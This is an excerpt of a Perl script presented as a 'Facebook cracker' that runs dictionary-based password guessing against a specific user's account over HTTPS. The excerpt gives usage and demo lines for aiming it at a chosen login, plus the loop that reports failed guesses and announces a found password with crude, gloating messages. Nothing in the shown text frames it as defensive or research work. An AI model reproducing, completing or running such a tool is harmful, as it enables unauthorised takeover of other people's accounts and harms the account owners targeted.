...
#
# Description:
# S4Y4Nfb Cracker is a password cracking tool written in perl to perform a dictionary-based attack on a specific Facebook user through HTTPS.
#
# Usage:
# perl S4Y4Nfb login wordlist
...
#
# Demo:
# perl S4Y4Nfb Facebooklogin@facebook.com wordlist.lst
#
...
if (!defined $success)
{
print "[-] $password -> Its not the fu**in victim :( \n";
close SSL;
}
else
{
print "\n########################################################\n";
print "[+] Madarchod! Account hacked => Pass is $password :D\n";
print "########################################################\n\n";
close SSL;
exit;
}
